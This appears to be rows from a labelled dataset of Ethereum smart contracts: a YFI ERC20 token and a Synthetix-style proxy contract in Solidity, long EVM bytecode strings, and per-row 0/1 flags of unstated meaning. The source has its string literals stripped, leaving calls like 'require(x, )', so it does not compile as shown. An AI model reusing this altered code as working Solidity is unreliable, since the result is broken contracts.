210156108bf57600080fd5b80820390509050815550600360043560e05260c052604060c02080546024358181830110156108ed57600080fd5b8082019050905081555060243561014052600435337fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6020610140a3600160005260206000f350005b6323b872dd6000511415610a5557341561094f57600080fd5b600435602051811061096057600080fd5b50602435602051811061097257600080fd5b5060006024351861098257600080fd5b600360043560e05260c052604060c0208054604435808210156109a457600080fd5b80820390509050815550600360243560e05260c052604060c02080546044358181830110156109d257600080fd5b80820190509050815550600460043560e05260c052604060c0203360e05260c052604060c020805460443580821015610a0a57600080fd5b80820390509050815550604435610140526024356004357fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6020610140a3600160005260206000f350005b63095ea7b36000511415610b18573415610a6e57600080fd5b6004356020518110610a7f57600080fd5b506024351515610a90576001610aaf565b60043360e05260c052604060c02060043560e05260c052604060c02054155b5b610ab957600080fd5b60243560043360e05260c052604060c02060043560e05260c052604060c0205560243561014052600435337f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9256020610140a3600160005260206000f350005b6340c10f196000511415610c50573415610b3157600080fd5b6004356020518110610b4257600080fd5b506006543314610b5157600080fd5b600060043518610b6057600080fd5b6009546301e13380818183011015610b7757600080fd5b8082019050905042101515610b9357600658016100a9565b6000505b600554602435818183011015610ba857600080fd5b8082019050905061014052610140516006580161038a565b610180526101405261018051610140511115610bdb57600080fd5b61014051600555600360043560e05260c052604060c0208054602435818183011015610c0657600080fd5b808201905090508155506024356101a05260043560007fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60206101a0a3600160005260206000f350005b6342966c686000511415610cef573415610c6957600080fd5b60033360e05260c052604060c020805460043580821015610c8957600080fd5b808203905090508155506005805460043580821015610ca757600080fd5b80820390509050815550600435610140526000337fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6020610140a3600160005260206000f350005b63e1430e066000511415610e71573415610d0857600080fd5b6060600435600401610140376040600435600401351115610d2857600080fd5b60406024356004016101c0376020602435600401351115610d4857600080fd5b6308c379a0610220526020610240526024610260527f4f6e6c792061646d696e20697320616c6c6f77656420746f206368616e676520610280527f6e616d65000000000000000000000000000000000000000000000000000000006102a052610260506007543314610dbb57608461023cfd5b61014080600060c052602060c020602082510161012060006003818352015b82610120516020021115610ded57610e0f565b61012051602002850151610120518501555b8151600101808352811415610dda575b5050505050506101c080600160c052602060c020602082510161012060006002818352015b82610120516020021115610e4757610e69565b61012051602002850151610120518501555b8151600101808352811415610e34575b505050505050005b6306fdde036000511415610f25573415610e8a57600080fd5b60008060c052602060c020610180602082540161012060006003818352015b82610120516020021115610ebc57610ede565b61012051850154610120516020028501525b8151600101808352811415610ea9575b50505050505061018051806101a001818260206001820306601f82010390500336823750506020610160526040610180510160206001820306601f8201039050610160f350005b6395d89b416000511415610fd9573415610f3e57600080fd5b60018060c052602060c020610180602082540161012060006002818352015b82610120516020021115610f7057610f92565b61012051850154610120516020028501525b8151600101808352811415610f5d575b50505050505061018051806101a001818260206001820306601f82010390500336823750506020610160526040610180510160206001820306601f8201039050610160f350005b63313ce5676000511415611000573415610ff257600080fd5b60025460005260206000f350005b6370a08231600051141561104757341561101957600080fd5b600435602051811061102a57600080fd5b50600360043560e05260c052604060c0205460005260206000f350005b6307546172600051141561106e57341561106057600080fd5b60065460005260206000f350005b63f851a440600051141561109557341561108757600080fd5b60075460005260206000f350005b63f9a40bf660005114156110bc5734156110ae57600080fd5b60085460005260206000f350005b637375be2660005114156110e35734156110d557600080fd5b60095460005260206000f350005b632c4e722e600051141561110a5734156110fc57600080fd5b600a5460005260206000f350005b5b60006000fd,0,0,0,0,0,0,0,0,0,0,0,0,0,,0,0,0
"pragma solidity ^0.5.16;interface IERC20 { function totalSupply() external view returns (uint); function balanceOf(address account) external view returns (uint); function transfer(address recipient, uint amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint amount) external returns (bool); function transferFrom(address sender, address recipient, uint amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value);}contract Context { constructor () internal { } function _msgSender() internal view returns (address payable) { return msg.sender; }}contract ERC20 is Context, IERC20 { using SafeMath for uint; mapping (address => uint) private _balances; mapping (address => mapping (address => uint)) private _allowances; uint private _totalSupply; function totalSupply() public view returns (uint) { return _totalSupply; } function balanceOf(address account) public view returns (uint) { return _balances[account]; } function transfer(address recipient, uint amount) public returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view returns (uint) { return _allowances[owner][spender]; } function approve(address spender, uint amount) public returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint amount) public returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint addedValue) public returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint amount) internal { require(sender != address(0), ); require(recipient != address(0), ); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint amount) internal { require(account != address(0), ); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint amount) internal { require(account != address(0), ); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint amount) internal { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }}contract ERC20Detailed is IERC20 { string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol, uint8 decimals) public { _name = name; _symbol = symbol; _decimals = decimals; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; }}library SafeMath { function add(uint a, uint b) internal pure returns (uint) { uint c = a + b; require(c >= a, ); return c; } function sub(uint a, uint b) internal pure returns (uint) { return sub(a, b, ); } function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) { require(b <= a, errorMessage); uint c = a - b; return c; } function mul(uint a, uint b) internal pure returns (uint) { if (a == 0) { return 0; } uint c = a * b; require(c / a == b, ); return c; } function div(uint a, uint b) internal pure returns (uint) { return div(a, b, ); } function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) { require(b > 0, errorMessage); uint c = a / b; return c; }}library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != 0x0 && codehash != accountHash); }}library SafeERC20 { using SafeMath for uint; using Address for address; function safeTransfer(IERC20 token, address to, uint value) internal { callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); } function safeTransferFrom(IERC20 token, address from, address to, uint value) internal { callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value)); } function safeApprove(IERC20 token, address spender, uint value) internal { require((value == 0) || (token.allowance(address(this), spender) == 0), ); callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } function callOptionalReturn(IERC20 token, bytes memory data) private { require(address(token).isContract(), ); (bool success, bytes memory returndata) = address(token).call(data); require(success, ); if (returndata.length > 0) { require(abi.decode(returndata, (bool)), ); } }}contract YFI is ERC20, ERC20Detailed { using SafeERC20 for IERC20; using Address for address; using SafeMath for uint; address public governance; mapping (address => bool) public minters; constructor () public ERC20Detailed(, , 18) { governance = msg.sender; } function mint(address account, uint amount) public { require(minters[msg.sender], ); _mint(account, amount); } function setGovernance(address _governance) public { require(msg.sender == governance, ); governance = _governance; } function addMinter(address _minter) public { require(msg.sender == governance, ); minters[_minter] = true; } function removeMinter(address _minter) public { require(msg.sender == governance, ); minters[_minter] = false; }}",0x608060405234801561001057600080fd5b506004361061010b5760003560e01c80635aa6e675116100a2578063a457c2d711610071578063a457c2d714610522578063a9059cbb14610588578063ab033ea9146105ee578063dd62ed3e14610632578063f46eccc4146106aa5761010b565b80635aa6e675146103b957806370a082311461040357806395d89b411461045b578063983b2d56146104de5761010b565b80633092afd5116100de5780633092afd51461029d578063313ce567146102e1578063395093511461030557806340c10f191461036b5761010b565b806306fdde0314610110578063095ea7b31461019357806318160ddd146101f957806323b872dd14610217575b600080fd5b610118610706565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561015857808201518184015260208101905061013d565b50505050905090810190601f1680156101855780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101df600480360360408110156101a957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506107a8565b604051808215151515815260200191505060405180910390f35b6102016107c6565b6040518082815260200191505060405180910390f35b6102836004803603606081101561022d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506107d0565b604051808215151515815260200191505060405180910390f35b6102df600480360360208110156102b357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108a9565b005b6102e96109c7565b604051808260ff1660ff16815260200191505060405180910390f35b6103516004803603604081101561031b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506109de565b604051808215151515815260200191505060405180910390f35b6103b76004803603604081101561038157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610a91565b005b6103c1610b5e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6104456004803603602081101561041957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610b84565b6040518082815260200191505060405180910390f35b610463610bcc565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156104a3578082015181840152602081019050610488565b50505050905090810190601f1680156104d05780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610520600480360360208110156104f457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610c6e565b005b61056e6004803603604081101561053857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610d8c565b604051808215151515815260200191505060405180910390f35b6105d46004803603604081101561059e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610e59565b604051808215151515815260200191505060405180910390f35b6106306004803603602081101561060457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610e77565b005b6106946004803603604081101561064857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610f7e565b6040518082815260200191505060405180910390f35b6106ec600480360360208110156106c057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611005565b604051808215151515815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561079e5780601f106107735761010080835404028352916020019161079e565b820191906000526020600020905b81548152906001019060200180831161078157829003601f168201915b5050505050905090565b60006107bc6107b5611025565b848461102d565b6001905092915050565b6000600254905090565b60006107dd848484611224565b61089e846107e9611025565b6108998560405180606001604052806028815260200161184960289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061084f611025565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546114da9092919063ffffffff16565b61102d565b600190509392505050565b600560019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461096c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f21676f7665726e616e636500000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6000600560009054906101000a900460ff16905090565b6000610a876109eb611025565b84610a8285600160006109fc611025565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461159a90919063ffffffff16565b61102d565b6001905092915050565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16610b50576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260078152602001807f216d696e7465720000000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b610b5a8282611622565b5050565b600560019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610c645780601f10610c3957610100808354040283529160200191610c64565b820191906000526020600020905b815481529060010190602001808311610c4757829003601f168201915b5050505050905090565b600560019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610d31576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f21676f7665726e616e636500000000000000000000000000000000000000000081525060200191505060405180910390fd5b6001600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6000610e4f610d99611025565b84610e4a856040518060600160405280602581526020016118ba6025913960016000610dc3611025565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546114da9092919063ffffffff16565b61102d565b6001905092915050565b6000610e6d610e66611025565b8484611224565b6001905092915050565b600560019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610f3a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f21676f7665726e616e636500000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600560016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60066020528060005260406000206000915054906101000a900460ff1681565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156110b3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806118966024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611139576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260228152602001806118016022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156112aa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806118716025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611330576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001806117de6023913960400191505060405180910390fd5b61139b81604051806060016040528060268152602001611823602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546114da9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061142e816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461159a90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290611587576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561154c578082015181840152602081019050611531565b50505050905090810190601f1680156115795780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015611618576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156116c5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b6116da8160025461159a90919063ffffffff16565b600281905550611731816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461159a90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa265627a7a72315820550d0f99ce1b508d46ec652e7b7c74f8267234c5be6b8fd1467d17dad8a5380064736f6c63430005110032,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
" pragma solidity 0.4.25; contract Owned { address public owner; address public nominatedOwner; constructor(address _owner) public { require(_owner != address(0), ); owner = _owner; emit OwnerChanged(address(0), _owner); } function nominateNewOwner(address _owner) external onlyOwner { nominatedOwner = _owner; emit OwnerNominated(_owner); } function acceptOwnership() external { require(msg.sender == nominatedOwner, ); emit OwnerChanged(owner, nominatedOwner); owner = nominatedOwner; nominatedOwner = address(0); } modifier onlyOwner { require(msg.sender == owner, ); _; } event OwnerNominated(address newOwner); event OwnerChanged(address oldOwner, address newOwner); } contract Proxy is Owned { Proxyable public target; bool public useDELEGATECALL; constructor(address _owner) Owned(_owner) public {} function setTarget(Proxyable _target) external onlyOwner { target = _target; emit TargetUpdated(_target); } function setUseDELEGATECALL(bool value) external onlyOwner { useDELEGATECALL = value; } function _emit(bytes callData, uint numTopics, bytes32 topic1, bytes32 topic2, bytes32 topic3, bytes32 topic4) external onlyTarget { uint size = callData.length; bytes memory _callData = callData; assembly { switch numTopics case 0 { log0(add(_callData, 32), size) } case 1 { log1(add(_callData, 32), size, topic1) } case 2 { log2(add(_callData, 32), size, topic1, topic2) } case 3 { log3(add(_callData, 32), size, topic1, topic2, topic3) } case 4 { log4(add(_callData, 32), size, topic1, topic2, topic3, topic4) } } } function() external payable { if (useDELEGATECALL) { assembly { let free_ptr := mload(0x40) calldatacopy(free_ptr, 0, calldatasize) let result := delegatecall(gas, sload(target_slot), free_ptr, calldatasize, 0, 0) returndatacopy(free_ptr, 0, returndatasize) if iszero(result) { revert(free_ptr, returndatasize) } return(free_ptr, returndatasize) } } else { target.setMessageSender(msg.sender); assembly { let free_ptr := mload(0x40) calldatacopy(free_ptr, 0, calldatasize) let result := call(gas, sload(target_slot), callvalue, free_ptr, calldatasize, 0, 0) returndatacopy(free_ptr, 0, returndatasize) if iszero(result) { revert(free_ptr, returndatasize) } return(free_ptr, returndatasize) } } } modifier onlyTarget { require(Proxyable(msg.sender) == target, ); _; } event TargetUpdated(Proxyable newTarget); } // This contract should be treated like an abstract contract contract Proxyable is Owned { Proxy public proxy; Proxy public integrationProxy; address messageSender; constructor(address _proxy, address _owner) Owned(_owner) public { proxy = Proxy(_proxy); emit ProxyUpdated(_proxy); } function setProxy(address _proxy) external onlyOwner { proxy = Proxy(_proxy); emit ProxyUpdated(_proxy); } function setIntegrationProxy(address _integrationProxy) external onlyOwner { integrationProxy = Proxy(_integrationProxy); } function setMessageSender(address sender) external onlyProxy { messageSender = sender; } modifier onlyProxy { require(Proxy(msg.sender) == proxy || Proxy(msg.sender) == integrationProxy, ); _; } modifier optionalProxy { if (Proxy(msg.sender) != proxy && Proxy(msg.sender) != integrationProxy) { messageSender = msg.sender; } _; } modifier optionalProxy_onlyOwner { if (Proxy(msg.sender) != proxy && Proxy(msg.sender) != integrationProxy) { messageSender = msg.sender; } require(messageSender == owner, ); _; } event ProxyUpdated(address proxyAddress); } contract IERC20 { function totalSupply() public view returns (uint); function balanceOf(address owner) public view returns (uint); function allowance(address owner, address spender) public view returns (uint); function transfer(address to, uint value) public returns (bool); function approve(address spender, uint value) public returns (bool); function transferFrom(address from, address to, uint value) public returns (bool); // ERC20 Optional function name() public view returns (string); function symbol() public view returns (string); function decimals() public view returns (uint8); event Transfer( address indexed from, address indexed to, uint value ); event Approval( address indexed owner, address indexed spender, uint value ); } contract ProxyERC20 is Proxy, IERC20 { constructor(address _owner) Proxy(_owner) public {} // ------------- ERC20 Details ------------- // function name() public view returns (string){ // Immutable static call from target contract return IERC20(target).name(); } function symbol() public view returns (string){ // Immutable static call from target contract return IERC20(target).symbol(); } function decimals() public view returns (uint8){ // Immutable static call from target contract return IERC20(target).decimals(); } // ------------- ERC20 Interface ------------- // function totalSupply() public view returns (uint256) { // Immutable static call from target contract return IERC20(target).totalSupply(); } function balanceOf(address owner) public view returns (uint256) { // Immutable static call from target contract return IERC20(target).balanceOf(owner); } function allowance( address owner, address spender ) public view returns (uint256) { // Immutable static call from target contract return IERC20(target).allowance(owner, spender); } function transfer(address to, uint256 value) public returns (bool) { // Mutable state call requires the proxy to tell the target who the msg.sender is. target.setMessageSender(msg.sender); // Forward the ERC20 call to the target contract IERC20(target).transfer(to, value); // Event emitting will occur via Synthetix.Proxy._emit() return true; } function approve(address spender, uint256 value) public returns (bool) { // Mutable state call requires the proxy to tell the target who the msg.sender is. target.setMessageSender(msg.sender); // Forward the ERC20 call to the target contract IERC20(target).approve(spender, value); // Event emitting will occur via Synthetix.Proxy._emit() return true; } function transferFrom( address from, address to, uint256 value ) public returns (bool) { // Mutable state call requires the proxy to tell the target who the msg.sender is. target.setMessageSender(msg.sender); // Forward the ERC20 call to the target contract IERC20(target).transferFrom(from, to, value); // Event emitting will occur via Synthetix.Proxy._emit() return true; } } ",0x6080604052600436106100fb5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde0381146101d0578063095ea7b31461025a5780631627540c1461029257806318160ddd146102b357806323b872dd146102da578063313ce5671461030457806353a47bb71461032f57806370a0823114610360578063776d1a011461038157806379ba5097146103a25780638da5cb5b146103b7578063907dff97146103cc57806395578ebd146103fc57806395d89b4114610411578063a9059cbb14610426578063befff6af1461044a578063d4b8399214610464578063dd62ed3e14610479575b60025474010000000000000000000000000000000000000000900460ff161561014457604051366000823760008036836002545af43d6000833e801515610140573d82fd5b3d82f35b6002546040805160e160020a635e33fc190281523360048201529051600160a060020a039092169163bc67f8329160248082019260009290919082900301818387803b15801561019357600080fd5b505af11580156101a7573d6000803e3d6000fd5b5050505060405136600082376000803683346002545af13d6000833e801515610140573d82fd5b005b3480156101dc57600080fd5b506101e56104a0565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561021f578181015183820152602001610207565b50505050905090810190601f16801561024c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561026657600080fd5b5061027e600160a060020a036004351660243561058c565b604080519115158252519081900360200190f35b34801561029e57600080fd5b506101ce600160a060020a0360043516610696565b3480156102bf57600080fd5b506102c861077f565b60408051918252519081900360200190f35b3480156102e657600080fd5b5061027e600160a060020a036004358116906024351660443561080f565b34801561031057600080fd5b50610319610922565b6040805160ff9092168252519081900360200190f35b34801561033b57600080fd5b50610344610981565b60408051600160a060020a039092168252519081900360200190f35b34801561036c57600080fd5b506102c8600160a060020a0360043516610990565b34801561038d57600080fd5b506101ce600160a060020a0360043516610a2d565b3480156103ae57600080fd5b506101ce610b16565b3480156103c357600080fd5b50610344610c1e565b3480156103d857600080fd5b506101ce60246004803582810192910135903560443560643560843560a435610c2d565b34801561040857600080fd5b5061027e610d42565b34801561041d57600080fd5b506101e5610d63565b34801561043257600080fd5b5061027e600160a060020a0360043516602435610dc2565b34801561045657600080fd5b506101ce6004351515610e97565b34801561047057600080fd5b50610344610f5f565b34801561048557600080fd5b506102c8600160a060020a0360043581169060243516610f6e565b600254604080517f06fdde030000000000000000000000000000000000000000000000000000000081529051606092600160a060020a0316916306fdde0391600480830192600092919082900301818387803b1580156104ff57600080fd5b505af1158015610513573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101561053c57600080fd5b81019080805164010000000081111561055457600080fd5b8201602081018481111561056757600080fd5b815164010000000081118282018710171561058157600080fd5b509094505050505090565b6002546040805160e160020a635e33fc190281523360048201529051600092600160a060020a03169163bc67f832916024808301928692919082900301818387803b1580156105da57600080fd5b505af11580156105ee573d6000803e3d6000fd5b5050600254604080517f095ea7b3000000000000000000000000000000000000000000000000000000008152600160a060020a03888116600483015260248201889052915191909216935063095ea7b3925060448083019260209291908290030181600087803b15801561066157600080fd5b505af1158015610675573d6000803e3d6000fd5b505050506040513d602081101561068b57600080fd5b506001949350505050565b600054600160a060020a0316331461071e576040805160e560020a62461bcd02815260206004820152602f60248201527f4f6e6c792074686520636f6e7472616374206f776e6572206d6179207065726660448201527f6f726d207468697320616374696f6e0000000000000000000000000000000000606482015290519081900360840190fd5b60018054600160a060020a03831673ffffffffffffffffffffffffffffffffffffffff19909116811790915560408051918252517f906a1c6bd7e3091ea86693dd029a831c19049ce77f1dce2ce0bab1cacbabce229181900360200190a150565b600254604080517f18160ddd0000000000000000000000000000000000000000000000000000000081529051600092600160a060020a0316916318160ddd91600480830192602092919082900301818787803b1580156107de57600080fd5b505af11580156107f2573d6000803e3d6000fd5b505050506040513d602081101561080857600080fd5b5051905090565b6002546040805160e160020a635e33fc190281523360048201529051600092600160a060020a03169163bc67f832916024808301928692919082900301818387803b15801561085d57600080fd5b505af1158015610871573d6000803e3d6000fd5b5050600254604080517f23b872dd000000000000000000000000000000000000000000000000000000008152600160a060020a03898116600483015288811660248301526044820188905291519190921693506323b872dd925060648083019260209291908290030181600087803b1580156108ec57600080fd5b505af1158015610900573d6000803e3d6000fd5b505050506040513d602081101561091657600080fd5b50600195945050505050565b600254604080517f313ce5670000000000000000000000000000000000000000000000000000000081529051600092600160a060020a03169163313ce56791600480830192602092919082900301818787803b1580156107de57600080fd5b600154600160a060020a031681565b600254604080517f70a08231000000000000000000000000000000000000000000000000000000008152600160a060020a038481166004830152915160009392909216916370a082319160248082019260209290919082900301818787803b1580156109fb57600080fd5b505af1158015610a0f573d6000803e3d6000fd5b505050506040513d6020811015610a2557600080fd5b505192915050565b600054600160a060020a03163314610ab5576040805160e560020a62461bcd02815260206004820152602f60248201527f4f6e6c792074686520636f6e7472616374206f776e6572206d6179207065726660448201527f6f726d207468697320616374696f6e0000000000000000000000000000000000606482015290519081900360840190fd5b60028054600160a060020a03831673ffffffffffffffffffffffffffffffffffffffff19909116811790915560408051918252517f814250a3b8c79fcbe2ead2c131c952a278491c8f4322a79fe84b5040a810373e9181900360200190a150565b600154600160a060020a03163314610b9e576040805160e560020a62461bcd02815260206004820152603560248201527f596f75206d757374206265206e6f6d696e61746564206265666f726520796f7560448201527f2063616e20616363657074206f776e6572736869700000000000000000000000606482015290519081900360840190fd5b60005460015460408051600160a060020a03938416815292909116602083015280517fb532073b38c83145e3e5135377a08bf9aab55bc0fd7c1179cd4fb995d2a5159c9281900390910190a1600180546000805473ffffffffffffffffffffffffffffffffffffffff19908116600160a060020a03841617909155169055565b600054600160a060020a031681565b600254600090606090600160a060020a03163314610c95576040805160e560020a62461bcd02815260206004820152601460248201527f4d7573742062652070726f787920746172676574000000000000000000000000604482015290519081900360640190fd5b604080516020601f8b01819004810282018101909252898152899350908a9084908190840183828082843782019150505050505090508660008114610cf95760018114610d045760028114610d105760038